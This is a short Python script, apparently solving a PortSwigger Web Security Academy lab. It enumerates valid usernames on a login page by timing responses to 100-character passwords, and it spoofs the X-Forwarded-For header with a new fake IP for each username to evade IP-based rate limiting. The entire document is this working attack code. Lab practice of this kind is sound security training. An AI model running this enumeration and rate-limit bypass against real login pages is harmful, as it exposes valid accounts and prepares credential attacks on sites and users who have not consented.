import requests

url = "https://0a7900e7047bef828050d05000560095.web-security-academy.net/login"

with open("usernames.txt", "r") as f:
    usernames = f.read().splitlines()

usernames = ["wiener"] + [username for username in usernames if username != "wiener"]
for i, username in enumerate(usernames):
    total_time = 0
    for j in range(3):
        data = {"username":username, "password": "A"*100}

        fake_ip = f"{i}.1.1.1"
        headers = {"X-Forwarded-For": fake_ip}

        response=requests.post(url, data=data, headers=headers)
        total_time += response.elapsed.total_seconds()

    response_time = total_time/3
    print(f"{username}:{response_time}")